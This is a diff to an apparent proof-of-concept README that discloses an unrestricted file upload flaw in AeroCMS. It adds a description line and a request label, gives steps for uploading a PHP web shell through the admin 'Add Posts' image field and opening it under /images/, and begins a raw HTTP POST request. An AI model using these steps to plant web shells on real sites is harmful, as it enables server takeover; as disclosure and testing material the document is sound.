@@ -1,4 +1,5 @@
 # AeroCMS-Unrestricted-File-Upload-POC
+* `Description` Upload web shell at `Post Status` in admin panel
 ## Step to Reproduct
 * Login to admin panel -> `Posts` -> `Add Posts` -> `Post Image` -> upload malicious file `shell.php` -> access `/images/shell.php` on url -> `shell.php page`
 ## Exploit
@@ -9,6 +10,7 @@
 ![image](https://user-images.githubusercontent.com/79050415/157001142-334f5f43-cea9-4711-a56a-1b4494f118d3.png)
 
 # POC
+* Request
 ```c
 POST /AeroCMS/admin/posts.php?source=add_post HTTP/1.1
 Host: localhost:8080
